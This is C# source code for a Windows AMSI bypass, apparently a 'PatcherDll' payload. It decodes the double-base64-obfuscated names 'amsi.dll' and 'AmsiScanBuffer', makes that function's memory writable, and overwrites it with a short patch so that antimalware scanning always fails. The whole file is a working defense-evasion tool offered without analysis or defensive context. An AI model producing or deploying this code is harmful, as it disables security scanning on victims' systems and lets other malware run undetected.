using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace EntryPoint
{
    public class Entry
    {
        static void Main(string[] args)
        {
            Start();
        }

        public static void Start()
        {
            //File.AppendAllText(@"c:\users\public\log.txt", $"{DateTime.Now} Running PatcherDll{Environment.NewLine}");
#if DEBUG
            Console.WriteLine("Running PatcherDll.");
#endif 

#if DEBUG
            Console.WriteLine("Before Patching");
#endif
            try
            {
                PatchAMSI();

#if DEBUG
                Console.WriteLine("Patched");
#endif
            }
            catch (Exception ex)
            {
#if DEBUG
                Console.WriteLine("Cannot Patch AMSI");
#endif
            }
        }

        //static string dec(string enc)
        //{
        //    byte[] b = Convert.FromBase64String(enc);
        //    return Encoding.UTF8.GetString(b);
        //}

        static string Dec(string enc, int times)
        {
            string result = enc;

            for (int i = 0; i < times; i++)
            {
                byte[] bytes = Convert.FromBase64String(result);
                result = Encoding.UTF8.GetString(bytes);
            }

            return result;
        }

        static string Enc(string text, int times)
        {
            string result = text;

            for (int i = 0; i < times; i++)
            {
                byte[] bytes = Encoding.UTF8.GetBytes(result);
                result = Convert.ToBase64String(bytes);
            }

            return result;
        }

        static void PatchAMSI()
        {
            //var enc = Enc("amsi.dll", 2);
            //enc = Enc("AmsiScanBuffer", 2);

            var lib = LoadLibrary(Dec("WVcxemFTNWtiR3c9", 2));
            var asb = GetProcAddress(lib, Dec("UVcxemFWTmpZVzVDZFdabVpYST0=", 2));
            var patch = GetPatch;
            _ = VirtualProtect(asb, (UIntPtr)patch.Length, 0x40, out uint oldProtect);
            Marshal.Copy(patch, 0, asb, patch.Length);
            _ = VirtualProtect(asb, (UIntPtr)patch.Length, oldProtect, out uint _);
        }

        static byte[] GetPatch
        {
            get
            {
                if (Is64Bit)
                {
                    return new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
                }

                return new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
            }
        }

        static bool Is64Bit
        {
            get
            {
                return IntPtr.Size == 8;
            }
        }

        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(
           IntPtr hModule,
           string procName);

        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(
            string name);

        [DllImport("kernel32")]
        static extern bool VirtualProtect(
            IntPtr lpAddress,
            UIntPtr dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);
    }
}

